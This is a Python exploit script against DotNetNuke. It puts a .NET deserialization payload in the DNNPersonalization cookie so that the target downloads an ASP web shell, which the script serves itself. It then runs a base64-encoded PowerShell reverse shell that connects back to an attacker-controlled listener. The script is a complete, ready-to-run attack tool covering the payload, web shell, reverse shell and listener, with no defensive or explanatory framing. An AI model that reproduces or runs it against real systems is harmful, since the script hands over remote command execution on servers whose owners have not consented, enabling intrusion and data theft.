#!/usr/bin/python3
import requests as r, sys, base64, threading, socket, time
from http.server import HTTPServer, BaseHTTPRequestHandler

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self, message):
        content = '''
<% Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function %>
<HTML><BODY><FORM action="" method="GET"><input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run"></FORM><PRE><% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%></BODY></HTML>
'''
        return content.encode("utf8")  #NOTE: must return a bytes object!

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html("hi!"))

def run(server_class=HTTPServer, handler_class=S, addr="localhost", port=80): ##Made change; if would not work, change to localhost and port 8000
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)
    httpd.handle_request()
    httpd.server_close()

def websrv(lhost, lport):
	run(addr=str(lhost), port=int(lport))

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    print('[+] Connection received from ',addr)
    conn.send("\n".encode())
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        time.sleep(1)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())

        #Remove the output of the "input()" function (no need for this shell)
        #sys.stdout.write("\033[A" + ans.split("\n")[-1])

def exploit():
	s = r.Session()
	s.headers.update({'Cookie':'DNNPersonalization=<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://{}:{}/poc.txt</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmd.asp</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'.format(lhost,webport)})
	s.get("http://{}:{}/dotnetnuke/".format(rhost,rport))
	s.get("http://{}:{}/dotnetnuke/FireTheNuke".format(rhost,rport))

def getshell():
    psh = '$client = New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'.format(lhost,lport).encode('UTF-16LE')
    ps64 = base64.b64encode(psh)
    cmd = "powershell.exe -e " + ps64.decode("UTF-8")
    listen_thread.start()
    print(r.get("http://{}:{}/dotnetnuke/cmd.asp?cmd={}".format(rhost,rport,cmd)))
    listen_thread.join()

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT> <WEBPORT>\n".format(sys.argv[0]))
        print("(+) RHOST - Remote server which runs vulnerable version of DotNetNuke")
        print("(+) RPORT - Remote application port")
        print("(+) LHOST - Local IP Address to get shell")
        print("(+) LPORT - Local Port to get shell")
        print("(+) WEBPORT - Local Port for websrv\n")
        sys.exit(-1)

    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
    webport = sys.argv[5]
    run_thread = threading.Thread(target=websrv, args=(lhost, webport))
    listen_thread = threading.Thread(target=listen, args=(lhost, lport))
    print("[+] Starting websrv on {}:{}".format(lhost,lport))
    run_thread.start()
    print("[+] Exploiting target {}:{}".format(rhost,rport))
    exploit()
    getshell()
